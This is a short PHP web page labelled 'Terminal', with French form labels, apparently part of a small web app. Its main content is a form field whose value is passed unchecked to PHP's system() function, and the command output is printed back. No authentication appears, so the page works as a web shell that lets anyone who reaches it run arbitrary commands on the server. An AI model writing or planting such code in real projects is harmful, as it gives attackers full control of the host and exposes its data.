
<center>
<h1>Terminal</h1>
</center>
<?php

/*	$result = mysql_query('SELECT * FROM terminal');
	while($data = mysql_fetch_array($result))
	{
		echo $data['id']." - ".$data['content']."</br>";
	}
*/
?>

<div class="ui-body ui-body-e"style="width: 80%; min-height: 300px; margin: auto;">
		<code>

<?php
	$result = system($_POST['req']);

?>
	
		</code>
		</div>
<center>
<form action="index.php?page=terminal" method="POST">
<div data-role="fieldcontain">
<input type="text" name="req" id="name" data-role="none" placeHolder="commande"  style="width: 80%" value="" required>
</div>
<input type="submit" data-inline="true" value="Envoyer" data-theme="b"/>
</form>
</center>
